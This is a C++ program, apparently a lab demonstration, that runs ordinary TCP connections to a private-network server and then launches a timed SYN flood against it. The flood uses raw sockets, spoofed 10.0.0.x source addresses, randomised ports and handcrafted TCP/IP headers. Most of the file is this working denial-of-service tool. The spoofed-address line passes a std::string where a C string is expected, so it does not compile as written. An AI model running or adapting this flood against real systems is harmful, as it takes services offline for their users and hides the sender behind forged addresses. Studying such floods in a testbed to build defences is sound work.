// client_raw.cpp
#include <iostream>
#include <thread>
#include <chrono>
#include <random>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <string.h>

using namespace std;

// Target server details
const char* SERVER_IP = "192.168.64.3";
const int SERVER_PORT = 8080;
const char* CLIENT_IP = "192.168.64.2"; // Real client IP for legitimate traffic

// Pseudo header for TCP checksum (required for raw TCP)
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

// Checksum calculation function
unsigned short checksum(void* data, int length) {
    unsigned long sum = 0;
    unsigned short* buf = (unsigned short*)data;

    while (length > 1) {
        sum += *buf++;
        length -= 2;
    }
    if (length == 1) {
        sum += *(unsigned char*)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Legitimate traffic function (unchanged from previous)
void legitimate_traffic(bool& stop_flag) {
    while (!stop_flag) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            cerr << "Socket creation failed" << endl;
            continue;
        }

        sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            cerr << "Legitimate connection failed" << endl;
        } else {
            cout << "Legitimate connection established" << endl;
            this_thread::sleep_for(chrono::seconds(1));
        }
        close(sock);
        this_thread::sleep_for(chrono::milliseconds(500));
    }
}

// SYN flood with raw packets
void syn_flood_raw(bool& stop_flag) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        cerr << "Raw socket creation failed: " << strerror(errno) << endl;
        cerr << "Note: Raw sockets require root privileges" << endl;
        return;
    }

    // Tell kernel not to fill in IP header
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        cerr << "Setting IP_HDRINCL failed" << endl;
        close(sock);
        return;
    }

    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(1024, 65535); // Random source ports

    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

    while (!stop_flag) {
        // Packet buffer
        char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
        memset(packet, 0, sizeof(packet));

        // IP Header
        struct iphdr* iph = (struct iphdr*)packet;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htons(dis(gen)); // Random ID
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = inet_addr("10.0.0." + to_string(dis(gen) % 256)); // Spoofed IP
        iph->daddr = inet_addr(SERVER_IP);

        // TCP Header
        struct tcphdr* tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
        tcph->source = htons(dis(gen)); // Random source port
        tcph->dest = htons(SERVER_PORT);
        tcph->seq = htonl(rand()); // Random sequence number
        tcph->ack_seq = 0;
        tcph->doff = 5; // Data offset (header length in 32-bit words)
        tcph->syn = 1; // SYN flag set
        tcph->window = htons(5840);
        tcph->urg = 0;
        tcph->ack = 0;
        tcph->psh = 0;
        tcph->rst = 0;
        tcph->fin = 0;

        // Calculate TCP checksum
        pseudo_header psh;
        psh.source_address = iph->saddr;
        psh.dest_address = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));
        
        char check_buffer[sizeof(pseudo_header) + sizeof(struct tcphdr)];
        memcpy(check_buffer, &psh, sizeof(pseudo_header));
        memcpy(check_buffer + sizeof(pseudo_header), tcph, sizeof(struct tcphdr));
        tcph->check = checksum(check_buffer, sizeof(check_buffer));

        // Send the packet
        if (sendto(sock, packet, ntohs(iph->tot_len), 0, 
                   (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            cerr << "Send failed: " << strerror(errno) << endl;
        }

        this_thread::sleep_for(chrono::milliseconds(10)); // Control flood rate
    }

    close(sock);
}

int main() {
    bool stop_legitimate = false;
    bool stop_flood = false;

    cout << "t=0s: Starting legitimate traffic" << endl;
    thread legitimate_thread(legitimate_traffic, ref(stop_legitimate));

    this_thread::sleep_for(chrono::seconds(20));
    cout << "t=20s: Starting SYN flood attack (raw packets)" << endl;
    thread flood_thread(syn_flood_raw, ref(stop_flood));

    this_thread::sleep_for(chrono::seconds(80));
    cout << "t=100s: Stopping SYN flood attack" << endl;
    stop_flood = true;
    flood_thread.join();

    this_thread::sleep_for(chrono::seconds(40));
    cout << "t=140s: Stopping legitimate traffic" << endl;
    stop_legitimate = true;
    legitimate_thread.join();

    cout << "Demonstration complete" << endl;
    return 0;
}